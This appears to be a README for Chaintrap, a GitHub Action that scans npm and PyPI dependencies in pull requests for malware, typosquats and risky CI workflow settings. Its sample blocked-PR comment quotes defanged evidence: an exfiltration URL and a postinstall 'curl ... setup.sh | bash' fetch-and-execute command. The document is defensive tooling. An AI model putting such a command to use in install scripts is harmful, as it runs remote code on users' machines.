# Chaintrap Scan Action

**Stop malicious npm and PyPI packages before they merge — on every pull request.**

[![GitHub release](https://img.shields.io/github/v/release/chaintrap-sec/scan-action?label=release)](https://github.com/chaintrap-sec/scan-action/releases)
[![License](https://img.shields.io/github/license/chaintrap-sec/scan-action)](LICENSE)

Runner-local supply chain security for **npm** and **PyPI**. No API keys required. No source code leaves your GitHub runner.

---

## Why add this?

CVE scanners tell you a package has a vulnerability. **Chaintrap tells you a package is malware.**

Recent npm supply-chain campaigns ship obfuscated postinstall scripts, exfiltration endpoints, and typosquats that slip past `npm audit` and generic SCA. Chaintrap combines:

| Layer | What it catches |
| --- | --- |
| **OSV MAL-\*** | Known malicious packages (blocks by default) |
| **Content scan** | Suspicious URLs, domains, IPs, and shell commands inside **newly added** packages on PRs |
| **Workflow audit** | Risky CI config (`pull_request_target`, unpinned third-party actions) |
| **Heuristics** | Fresh releases, install scripts, typosquat signals (warn by default) |

Install once. Every PR gets a risk-scored summary, defanged IOC evidence, and SARIF for GitHub Security.

---

## What you see on a blocked PR

When a dependency fails, Chaintrap posts a structured comment (you wire this in — see install below):

```markdown
## Chaintrap supply chain scan

🚫 **Blocked**

| Metric | Value |
| --- | --- |
| Packages scanned | 14 |
| Blocked | 3 |

<details open>
<summary><strong>Blocked packages (3)</strong></summary>

### `@mastra/deployer@1.42.1` — BLOCK · 9.5/10

**TL;DR:** OSV malicious advisory: MAL-2026-1234

<details>
<summary>Evidence (2 shown)</summary>

- `CTC-NET001` `index.js:42` — Outbound HTTP
  - **URL:** `hxxps://telemetry-cdn-sync[.]com/collect`
  - **Domain:** `telemetry-cdn-sync[.]com`
- `CTC-CMD001` `postinstall.js:8` — Suspicious shell invocation
  - **Command:** `curl -fsSL hxxps://203[.]0[.]113[.]55/setup.sh | bash`

</details>

- **Remediation:** Remove or pin to a known-good version; verify lockfile diff.

</details>
```

URLs and IPs are **defanged** (`hxxps://`, `[.]`) so reviewers can triage safely in GitHub — no accidental clicks.

---

## 60-second install

**1.** Copy [examples/consumer-workflow.yml](examples/consumer-workflow.yml) to `.github/workflows/chaintrap.yml`.

**2.** Open a PR. Done.

Or paste this directly:

```yaml
name: Chaintrap
on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read
  pull-requests: write
  security-events: write

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - uses: chaintrap-sec/scan-action@v1.2.1
        id: chaintrap

      - uses: github/codeql-action/upload-sarif@v3
        if: always()
        continue-on-error: true
        with:
          sarif_file: ${{ steps.chaintrap.outputs.sarif-file }}
          category: chaintrap

      - uses: actions/github-script@v7
        if: github.event_name == 'pull_request' && always()
        with:
          script: |
            const fs = require('fs');
            const summaryPath = '${{ steps.chaintrap.outputs.summary-file }}';
            if (!fs.existsSync(summaryPath)) return;
            const body = fs.readFileSync(summaryPath, 'utf8');
            const marker = '<!-- chaintrap-sca -->';
            const { data: comments } = await github.rest.issues.listComments({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.issue.number,
            });
            const existing = comments.find(c => c.body && c.body.includes(marker));
            if (existing) {
              await github.rest.issues.updateComment({
                owner: context.repo.owner,
                repo: context.repo.repo,
                comment_id: existing.id,
                body,
              });
            } else {
              await github.rest.issues.createComment({
                owner: context.repo.owner,
                repo: context.repo.repo,
                issue_number: context.issue.number,
                body,
              });
            }
```

### Pinning for production

| Pin style | When to use |
| --- | --- |
| `@v1.2.1` | Latest semver tag — easy upgrades, review release notes |
| `@v1` | Floating major — tracks latest v1.x |
| `@<full-commit-sha>` | Maximum supply-chain hygiene — pin the action itself |

```yaml
- uses: chaintrap-sec/scan-action@e0b01c0  # v1.2.1
```

Want scan + SARIF only (no PR comment)? See [examples/minimal-workflow.yml](examples/minimal-workflow.yml).

---

## Zero secrets. Zero setup.

Works out of the box:

- Queries [OSV](https://osv.dev) for **MAL-\*** malicious advisories
- Downloads and statically scans **PR-added** package tarballs on the runner (size-capped, deleted after the job)
- Audits `.github/workflows` for CI hardening issues

Optional: plug in your own Supabase IOC feed for tenant-specific blocklists — [docs/IOC_PARTNER_ONBOARDING.md](docs/IOC_PARTNER_ONBOARDING.md).

---

## What blocks vs warns

| Signal | Default |
| --- | --- |
| Known malicious packages (OSV MAL-\*) | **Block** |
| Private threat indicators (optional IOC) | **Block** |
| Malware patterns in package code (PR-added) | **Block** (CRITICAL/HIGH) |
| Risky CI workflow config | **Block** (CRITICAL/HIGH) |
| Known CVE/GHSA | Warn |
| Fresh release (&lt;7 days) | Warn |
| npm install lifecycle scripts | Warn |
| Typosquat similarity | Warn |
| Scan errors (registry/OSV unavailable) | Warn — set `fail-on-error: "true"` to block |

Exit codes: `0` pass · `1` warnings only · `2` blocked.

---

## Repo policy (`.chaintrap.yml`)

Drop at repo root to tune gates without editing the workflow:

```yaml
minimum_release_age_days: 7
audit_workflows: true
gates:
  block_fresh_releases: false
  block_install_scripts: false
  fail_on_error: false
  content_scan: true
ignore:
  packages:
    - left-pad@1.0.0
  rules:
    - CTH-003
```

---

## Lockfiles & manifests

**Supported lockfiles:** `package-lock.json`, `pnpm-lock.yaml`, `yarn.lock`, `bun.lock`, `uv.lock`, `poetry.lock`, `Pipfile.lock`, pinned `requirements.txt`

**No lockfile yet?** With `resolve-manifests: auto` (default), Chaintrap compiles `package.json` ranges and unpinned `requirements.txt` on the runner (`npm install --package-lock-only`, `uv pip compile`). Commit lockfiles for faster, deterministic CI.

---

## Privacy

Scans run **entirely on the GitHub runner**:

- Lockfiles parsed locally
- OSV queries send package name + version only
- PR content scan downloads tarballs to a temp dir on the runner — **nothing uploaded**
- Application source code never leaves the runner

Full egress matrix: [docs/PRIVACY.md](docs/PRIVACY.md).

---

## Scope & honest limits

- Content scan runs on **packages newly added in the PR diff**, not your entire existing tree (keeps CI fast)
- Floating versions with **no manifest change** are caught on full scans, not PR diff
- Unpinned manifest compile adds ~5–45s cold, ~2–8s warm (uv cache)
- A clean scan reduces risk; it is not a guarantee a package is safe

---

## Inputs (common)

| Input | Default | Description |
| --- | --- | --- |
| `content-scan` | `true` | Static analysis of PR-added package contents |
| `resolve-manifests` | `auto` | Compile unpinned npm/PyPI manifests on runner |
| `audit-workflows` | `true` | Scan `.github/workflows` for hardening issues |
| `diff-mode` | `auto` | PR = diff-only; push = full scan |
| `fail-on-mal` | `true` | Block on OSV MAL-\* |
| `fail-on-cve` | `none` | CVE gate severity (`critical` … `none`) |
| `paths` | `` | Limit scan to subpaths (monorepos) |

All inputs: [action.yml](action.yml).

---

## Docs & releases

- [Privacy](docs/PRIVACY.md)
- [Private threat intel onboarding](docs/IOC_PARTNER_ONBOARDING.md)
- [Changelog](CHANGELOG.md)
- [Examples](examples/)

---

**Questions or design-partner access?** Open an issue or visit [chaintrap.com](https://chaintrap.com).
